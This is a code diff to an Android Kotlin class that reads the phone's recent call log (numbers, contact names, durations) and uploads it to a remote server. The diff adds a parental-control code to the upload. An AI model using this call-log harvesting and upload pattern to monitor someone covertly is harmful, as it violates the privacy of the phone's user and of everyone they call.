@@ -12,6 +12,11 @@ class CallLogReader(private val context: Context) {
 
     private val SERVER_URL = "https://overflowing-perception-production-17b2.up.railway.app/calls"
     private val DEVICE_NAME = android.os.Build.MODEL
+    private val parentCode: String
+        get() {
+            val prefs = context.getSharedPreferences("parent_control", Context.MODE_PRIVATE)
+            return prefs.getString("parent_code", "") ?: ""
+        }
 
     fun readAndSend() {
         Thread {
@@ -19,15 +24,8 @@ class CallLogReader(private val context: Context) {
                 val callList = JSONArray()
                 val cursor = context.contentResolver.query(
                     CallLog.Calls.CONTENT_URI,
-                    arrayOf(
-                        CallLog.Calls.NUMBER,
-                        CallLog.Calls.TYPE,
-                        CallLog.Calls.DATE,
-                        CallLog.Calls.DURATION,
-                        CallLog.Calls.CACHED_NAME
-                    ),
-                    null, null,
-                    "${CallLog.Calls.DATE} DESC LIMIT 50"
+                    arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.CACHED_NAME),
+                    null, null, "${CallLog.Calls.DATE} DESC LIMIT 50"
                 )
                 cursor?.use {
                     while (it.moveToNext()) {
@@ -37,19 +35,19 @@ class CallLogReader(private val context: Context) {
                             CallLog.Calls.MISSED_TYPE -> "Missed"
                             else -> "Unknown"
                         }
-                        val call = JSONObject().apply {
+                        callList.put(JSONObject().apply {
                             put("number", it.getString(0) ?: "Unknown")
                             put("type", type)
                             put("time", it.getLong(2))
                             put("duration", it.getInt(3))
                             put("name", it.getString(4) ?: "")
-                        }
-                        callList.put(call)
+                        })
                     }
                 }
                 val json = JSONObject().apply {
                     put("device", DEVICE_NAME)
                     put("calls", callList)
+                    put("code", parentCode)
                 }
                 val body = json.toString().toRequestBody("application/json".toMediaType())
                 OkHttpClient().newCall(
